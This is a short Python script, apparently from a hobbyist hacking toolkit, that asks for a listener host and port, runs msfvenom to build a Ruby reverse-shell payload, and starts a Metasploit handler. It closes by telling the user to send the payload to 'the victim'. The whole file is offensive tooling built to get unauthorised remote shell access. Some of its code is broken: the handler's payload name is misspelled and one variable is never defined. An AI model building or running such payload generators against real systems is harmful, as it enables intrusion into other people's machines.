import os
import sys
import socket
from check import *

check_root()
check_os()

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ip_status = (s.getsockname()[0])
except OSError:
    print('Нет интернета')
    sys.exit

clear()

logo = f'''
MM"""""""`MM          dP                
MM  mmmm,  M          88                
M'        .M dP    dP 88d888b. dP    dP 
MM  MMMb. "M 88    88 88'  `88 88    88 
MM  MMMMM  M 88.  .88 88.  .88 88.  .88 
MM  MMMMM  M `88888P' 88Y8888' `8888P88 
MMMMMMMMMMMM                        .88 
                                d8888P  

Code by: mython-dev:)
Instagram: @h4ckerworld or @mython-dev 
'''


def payloads():
    print(logo)
    try:
        print(f'Your LHOST: "{ip_status}"\n')
        lhost = input(f'Enter LHOST: ')
        print(f'Port example: "4444"')
        lport = input(f'Enter lport: ')
    except KeyboardInterrupt:
        print('\nВыход!\n')
        sys.exit()

    # i use payload for ruby ruby/shell_reverse_tcp

    os.system(f'msfvenom --platform ruby -p ruby/shell_reverse_tcp LHOST={lhost} LPORT={lport} -o mythicalpayload.rb')

    print(f'\nSaved payload: {directory}/mythicalpayload.rb\n')

    os.system(f'msfconsole -q -x "use exploit/multi/handler; set payload ruby/shell_reverse_tc;  set lhost {lhost} ; set lport {lport} ; run ; "')

    print(f'\nSend the newly created payload to the victim: {directory}/mythicalpayload.rb\n')

payloads()
